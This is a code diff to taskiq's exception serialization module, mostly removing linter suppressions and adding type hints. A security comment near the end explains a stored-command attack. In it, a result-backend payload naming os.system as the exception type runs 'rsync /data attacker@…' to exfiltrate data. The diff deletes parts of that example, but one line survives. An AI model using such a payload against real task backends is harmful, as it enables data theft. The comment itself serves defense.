@@ -2,7 +2,7 @@ import sys
 import traceback
 from inspect import getmro
 from itertools import takewhile
-from typing import (  # noqa: WPS235
+from typing import (
     Any,
     Generic,
     Iterable,
@@ -17,7 +17,7 @@ from typing import (  # noqa: WPS235
 import pydantic
 from typing_extensions import Protocol, TypeVar, runtime_checkable
 
-import taskiq.exceptions  # noqa: WPS301
+import taskiq.exceptions
 from taskiq.compat import IS_PYDANTIC2, validate_call
 
 DecodedType = TypeVar("DecodedType")
@@ -31,7 +31,7 @@ SEEN_EXCEPTIONS_CACHE: Set[int] = set()
 class Coder(Protocol, Generic[DecodedType, EncodedType]):  # pragma: no cover
     """Serializer protocol to check methods `loads` and `dumps`."""
 
-    def loads(self, s: EncodedType) -> DecodedType:  # noqa: D102, WPS111
+    def loads(self, s: EncodedType) -> DecodedType:  # noqa: D102
         ...
 
     def dumps(self, obj: DecodedType) -> EncodedType:  # noqa: D102
@@ -44,7 +44,7 @@ def _safe_str(obj: Any) -> str:
     try:
         return str(obj)
     except Exception as exc:
-        return "<Unrepresentable {!r}: {!r} {!r}>".format(  # noqa: P101
+        return "<Unrepresentable {!r}: {!r} {!r}>".format(
             type(obj),
             exc,
             "\n".join(traceback.format_stack()),
@@ -121,7 +121,7 @@ def ensure_serializable(
     return tuple(safe_exc_args)
 
 
-class _UnpickleableExceptionWrapper(Exception):
+class _UnpickleableExceptionWrapper(Exception):  # noqa: N818
     """Wraps unpickleable exceptions."""
 
     def __init__(
@@ -130,7 +130,7 @@ class _UnpickleableExceptionWrapper(Exception):
         exc_cls_name: str,
         exc_args: Tuple[Any, ...],
         text: str = "",
-    ):
+    ) -> None:
         self.exc_module = exc_module
         self.exc_cls_name = exc_cls_name
         self.exc_args = exc_args
@@ -206,7 +206,7 @@ def find_pickleable_exception(
             coder.loads(coder.dumps(superexc))
             return superexc
         except Exception:  # noqa: S110
-            pass  # noqa: WPS420
+            pass
 
     return None
 
@@ -225,7 +225,7 @@ def get_pickleable_exception(
         coder.loads(coder.dumps(exc))
         return exc
     except Exception:  # noqa: S110
-        pass  # noqa: WPS420
+        pass
 
     nearest = find_pickleable_exception(exc, coder)
     if nearest:
@@ -285,13 +285,13 @@ def _prepare_exception(
         return None
 
     SEEN_EXCEPTIONS_CACHE.add(id(exc))
-    try:  # noqa: WPS501
+    try:
         pickleable_exc = get_pickleable_exception(exc, coder)
-        try:  # noqa: WPS505
+        try:
             coder.loads(coder.dumps(pickleable_exc))
             return pickleable_exc
         except Exception:  # noqa: S110
-            pass  # noqa: WPS420
+            pass
 
         exctype = type(exc)
 
@@ -330,7 +330,7 @@ def prepare_exception(
 
 
 @validate_call(config=pydantic.ConfigDict(arbitrary_types_allowed=True))
-def exception_to_python(  # noqa: C901, WPS210
+def exception_to_python(
     exc: Optional[Union[BaseException, ExceptionRepr]],
 ) -> Optional[BaseException]:
     """Convert serialized exception to Python exception.
@@ -349,16 +349,16 @@ def exception_to_python(  # noqa: C901, WPS210
     exc_type = exc.exc_type
 
     if exc_module is None:
-        cls = create_exception_cls(exc_type, __name__)  # noqa: WPS117
+        cls = create_exception_cls(exc_type, __name__)
     else:
         try:
             # Load module and find exception class in that
-            cls = sys.modules[exc_module]  # type: ignore # noqa: WPS117
+            cls = sys.modules[exc_module]  # type: ignore
             # The type can contain qualified name with parent classes
             for name in exc_type.split("."):
-                cls = getattr(cls, name)  # noqa: WPS117
+                cls = getattr(cls, name)
         except (KeyError, AttributeError):
-            cls = create_exception_cls(  # noqa: WPS117
+            cls = create_exception_cls(
                 exc_type,
                 taskiq.exceptions.__name__,
             )
@@ -369,17 +369,11 @@ def exception_to_python(  # noqa: C901, WPS210
     # this is a security issue. Without the condition below, an attacker
     # could exploit a stored command vulnerability to execute arbitrary
     # python code such as:
-    # os.system("rsync /data attacker@192.168.56.100:~/data")
     # The attacker sets the task's result to a failure in the result
     # backend with the os as the module, the system function as the
     # exception type and the payload
     # rsync /data attacker@192.168.56.100:~/data
     # as the exception arguments like so:
-    # {
-    #   "exc_module": "os",
-    #   "exc_type": "system",
-    #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
-    # }
 
     if not isinstance(cls, type) or not issubclass(cls, BaseException):
         fake_exc_type = exc_type if exc_module is None else f"{exc_module}.{exc_type}"
